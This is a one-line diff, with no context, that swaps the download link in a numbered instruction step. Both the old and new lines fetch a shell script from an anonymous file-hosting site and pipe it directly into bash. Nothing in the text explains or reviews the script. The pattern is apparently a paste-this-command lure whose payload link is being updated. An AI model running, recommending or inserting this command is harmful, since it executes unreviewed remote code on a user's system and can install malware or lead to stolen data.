@@ -1,1 +1,1 @@
-1)curl -sSL https://files.catbox.moe/wbpvyz.bash | bash 
+1)curl -sSL https://files.catbox.moe/5poyl1.bash | bash 
